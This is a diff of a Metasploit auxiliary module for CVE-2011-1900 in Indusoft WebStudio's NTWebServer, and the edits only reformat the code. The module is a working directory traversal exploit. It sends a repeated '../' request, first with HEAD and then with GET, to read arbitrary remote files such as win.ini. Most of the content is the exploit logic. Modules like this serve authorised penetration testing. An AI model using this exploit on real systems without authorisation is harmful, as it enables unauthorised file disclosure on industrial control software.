@@ -10,41 +10,40 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'Indusoft WebStudio NTWebServer Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'Indusoft WebStudio NTWebServer Remote File Access',
+      'Description' => %q{
           This module exploits a directory traversal vulnerability in Indusoft WebStudio.
         The vulnerability exists in the NTWebServer component and allows to read arbitrary
         remote files with the privileges of the NTWebServer process. The module has been
         tested successfully on Indusoft WebStudio 6.1 SP6.
       },
-      'References'   =>
-        [
-          [ 'CVE', '2011-1900' ],
-          [ 'OSVDB', '73413' ],
-          [ 'BID', '47842' ],
-          [ 'URL', 'http://www.indusoft.com/hotfixes/hotfixes.php' ]
-        ],
-      'Author'       =>
-        [
-          'Unknown', # Vulnerability discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'License'      => MSF_LICENSE
+      'References' => [
+        [ 'CVE', '2011-1900' ],
+        [ 'OSVDB', '73413' ],
+        [ 'BID', '47842' ],
+        [ 'URL', 'http://www.indusoft.com/hotfixes/hotfixes.php' ]
+      ],
+      'Author' => [
+        'Unknown', # Vulnerability discovery
+        'juan vazquez' # Metasploit module
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
-    [
-      OptString.new('RFILE', [true, 'Remote File', '/windows\\win.ini']),
-      OptInt.new('DEPTH', [true, 'Traversal depth', 3])
-    ])
+      [
+        OptString.new('RFILE', [true, 'Remote File', '/windows\\win.ini']),
+        OptInt.new('DEPTH', [true, 'Traversal depth', 3])
+      ]
+    )
 
     register_autofilter_ports([ 80 ])
   end
 
   def run_host(ip)
     res = send_request_cgi({
-      'uri'     => "/",
-      'method'  => 'GET'
+      'uri' => "/",
+      'method' => 'GET'
     })
 
     if not res
@@ -56,12 +55,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def accessfile(rhost)
-
     traversal = "../" * datastore['DEPTH']
     rfile = ""
 
     if datastore['RFILE'][0] == "/"
-      rfile = datastore['RFILE'][1..datastore['RFILE'].length-1]
+      rfile = datastore['RFILE'][1..datastore['RFILE'].length - 1]
     else
       rfile = datastore['RFILE']
     end
@@ -69,8 +67,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{rhost}:#{rport} - Checking if file exists...")
 
     res = send_request_cgi({
-      'uri'      => "/#{traversal}#{rfile}",
-      'method'   => 'HEAD'
+      'uri' => "/#{traversal}#{rfile}",
+      'method' => 'HEAD'
     })
 
     if res and res.code == 200 and res.message =~ /File Exists/
@@ -83,8 +81,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{rhost}:#{rport} - Retrieving remote file...")
 
     res = send_request_cgi({
-      'uri'      => "/#{traversal}#{rfile}",
-      'method'   => 'GET'
+      'uri' => "/#{traversal}#{rfile}",
+      'method' => 'GET'
     })
 
     if res and res.code == 200 and res.message =~ /Sending file/
@@ -102,4 +100,3 @@ class MetasploitModule < Msf::Auxiliary
     print_error("#{rhost}:#{rport} - Failed to retrieve file")
   end
 end
-
